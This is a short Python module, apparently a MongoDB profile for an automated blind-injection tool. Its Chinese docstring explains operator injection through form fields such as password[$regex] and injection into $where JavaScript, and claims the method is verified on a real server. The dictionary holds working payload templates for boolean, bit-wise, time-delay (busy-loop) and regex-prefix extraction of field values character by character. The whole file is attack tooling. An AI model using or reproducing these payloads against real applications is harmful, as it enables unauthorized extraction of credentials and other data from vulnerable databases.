"""MongoDB — 两类注入面:
1. prefix(首选): 表单运算符注入, 典型 PHP 风格 password[$regex]=*,
   模板为 $regex 的值, 实现「值匹配 ^{S}[\\x20-\\x{HH}]」语义, 引擎按字符类二分。
2. $where(JS): 注入点落在 $where 的 JS 字符串值内
   (如 --data '{"user":"admin","$where":"*"}' --raw), 模板输出裸 JS 表达式;
   charCodeAt 提供布尔, 重循环提供时间; $where 被服务端禁用时只能用 prefix。
MongoDB 真机已验证(prefix/bool/bit/time)。"""

PROFILE = {
    'name': 'mongodb',
    'note': 'MongoDB (prefix=表单$regex; bool/time=$where 裸JS表达式, 已验证)',
    'err_tpl':   None,
    'err_regex': None,
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  'this.{F}.charCodeAt({P}-1)>{K}',
    'bit_tpl':   '(this.{F}.charCodeAt({P}-1)&{M})>0',
    'time_tpl':  'this.{F}.charCodeAt({P}-1)>{K}?(function(){var t=Date.now();while(Date.now()-t<{T}000);})():0',
    'prefix_tpl': '^{S}[\\x20-\\x{HH}]',
    'row_wrap':  None,
}
